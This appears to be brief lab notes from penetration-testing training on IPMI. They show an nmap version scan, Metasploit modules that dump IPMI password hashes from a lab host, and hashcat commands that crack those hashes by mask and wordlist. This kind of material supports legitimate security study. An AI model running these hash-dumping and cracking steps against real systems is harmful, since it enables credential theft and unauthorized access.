
Basic commands
```shell
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
run

```

Getting hashes using msfconsole
```shell
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts 10.129.42.195
show options 
run

hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt 
```